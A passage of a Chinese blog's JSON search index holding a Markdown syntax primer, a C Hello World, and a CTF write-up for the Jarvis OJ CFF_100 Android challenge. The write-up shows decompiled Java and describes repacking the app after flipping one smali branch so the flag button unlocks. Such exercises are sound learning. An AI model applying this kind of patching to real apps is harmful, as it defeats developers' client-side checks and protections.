语法简介","slug":"Markdown-语法简介","date":"2019-05-11T13:07:41.000Z","updated":"2019-08-10T02:17:13.990Z","comments":true,"path":"Markdown-语法简介.html","link":"","permalink":"https://bufsnake.github.io/Markdown-语法简介.html","excerpt":"","text":"以下能够操控基本的博客编写，各模块之间可以结合使用 标题 123456# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题 效果如下 一级标题二级标题三级标题四级标题五级标题六级标题 列表 1234567- 无序列表1- 无序列表2- 无序列表31. 有序列表12. 有序列表23. 有序列表3 效果如下 无序列表1 无序列表2 无序列表3 有序列表1 有序列表2 有序列表3 引用 1234&gt; 一级引用&gt;&gt; 二级引用&gt;&gt;&gt; 三级引用&gt;&gt;&gt;&gt; 四级引用 效果如下 一级引用 二级引用 三级引用 四级引用 区块 1缩进四个空格或一个制表符既可以获得一个区块 效果如下 这是一个区块 分割线 1___ 三个下滑线可以得到一个分割线 效果如下 代码高亮 1234...语言名 Codes...这里请将 . 换成 ` 效果如下 1print(\"hello world\") 斜体与加粗 123456斜体： *内容* _内容_加粗： **内容** __内容__ 效果如下 admin admin admin admin 超链接 12网站超链接：[name](url)图片超链接：![name](url) 效果如下 百度","categories":[{"name":"IDE","slug":"IDE","permalink":"https://bufsnake.github.io/categories/IDE/"}],"tags":[{"name":"Markdown","slug":"Markdown","permalink":"https://bufsnake.github.io/tags/Markdown/"}]},{"title":"jarvis oj---CFF_100 writeup","slug":"jarvis-oj-CFF-100-writeup","date":"2019-05-11T09:54:00.000Z","updated":"2019-08-09T15:22:24.692Z","comments":true,"path":"jarvis-oj-CFF-100-writeup.html","link":"","permalink":"https://bufsnake.github.io/jarvis-oj-CFF-100-writeup.html","excerpt":"","text":"CFF_100 writeuptags: CTF Jarvis OJ CFF_100 Android reversecategories: CTF Androiddate: 2019-05-11 17:54:05 首先将题目下载下来 拖入雷电模拟器,了解基本操作 拖到jadx-gui分析程序流程，查看主页面代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697package com.ctf.test.ctf_100;import android.os.Bundle;import android.os.Debug;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.Button;import android.widget.TextView;import java.util.Random;public class MainActivity extends AppCompatActivity &#123; public int has_gone_int; public int to_reach_int; public native String get_flag(int i); protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); ((Button) findViewById(R.id.button2)).setClickable(false); this.has_gone_int = 0; Random random = new Random(); this.to_reach_int = random.nextInt(); while (true) &#123; if (this.to_reach_int &lt; 0) &#123; this.to_reach_int *= -1; &#125; if (5 &lt; this.to_reach_int) &#123; this.to_reach_int %= 32; this.to_reach_int *= 16384; ((TextView) findViewById(R.id.data_to_reach)).setText(\"\" + this.to_reach_int); ((TextView) findViewById(R.id.tvResult)).setText(\"\"); return; &#125; this.to_reach_int = random.nextInt(); &#125; &#125; public void Btn_up_onclick(View v) &#123; this.has_gone_int++; ((TextView) findViewById(R.id.data_has_gone)).setText(\"\" + this.has_gone_int); if (this.to_reach_int &lt;= this.has_gone_int) &#123; ((Button) findViewById(R.id.button2)).setClickable(true); &#125; &#125; public void btn2_onclick(View v) &#123; ((TextView) findViewById(R.id.tvResult)).setText(\"&#123;Flag:\" + get_flag(this.to_reach_int) + \"&#125;\"); &#125; static &#123; if (!Debug.isDebuggerConnected()) &#123; System.loadLibrary(\"ctf\"); &#125; &#125;&#125; 发现： 楼梯数是程序启动时随机生成的，并且程序初始化的时候将getflag的按钮设置成不可操作，除非爬的楼梯数大于楼梯数才能按getflag的按钮，作为懒人，怎么可能真的点击那么多次，所以 拖到KALI里进行解包 在进行解包的时候加上-r命令，不对资源文件进行解包，因为在我打包的时候发现资源文件有问题，打包不了(知道详情的大佬可以告诉小弟) 接下来，我们对程序中关键跳转进行修改(此题做法不唯一)，让程序无论如何都可以按getflag按钮找到smali文件夹下的com/ctf/test/ctf_100/MainActivity.smali,直接搜索Btn_up_onclick方法，找到关键跳转，修改成相反的就行将if-gt 修改成if-le后打包 完成打包后签名当出现说明签名成功，再次拖入模拟器安装运行，爬一层，使爬到了，看flag按钮能够使用后，按爬到了，看flag按钮即可发现flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://bufsnake.github.io/categories/CTF/"},{"name":"Android","slug":"CTF/Android","permalink":"https://bufsnake.github.io/categories/CTF/Android/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://bufsnake.github.io/tags/CTF/"},{"name":"Jarvis OJ","slug":"Jarvis-OJ","permalink":"https://bufsnake.github.io/tags/Jarvis-OJ/"},{"name":"CFF_100","slug":"CFF-100","permalink":"https://bufsnake.github.io/tags/CFF-100/"},{"name":"Android reverse","slug":"Android-reverse","permalink":"https://bufsnake.github.io/tags/Android-reverse/"}]},{"title":"Hello World","slug":"Hello-World","date":"2019-05-11T03:18:32.000Z","updated":"2019-08-09T15:22:04.764Z","comments":true,"path":"Hello-World.html","link":"","permalink":"https://bufsnake.github.io/Hello-World.html","excerpt":"","text":"Hello World1234567#include &lt;stdio.h&gt;int main()&#123; printf(\"Hello World\"); return 0;&#125;","categories":[{"name":"HelloWorld","slug":"HelloWorld","permalink":"https://bufsnake.github.io/categories/HelloWorld/"}],"tags":[{"name":"Hello World","slug":"Hello-World","permalink":"https://bufsnake.github.io/tags/Hello-World/"}]}]}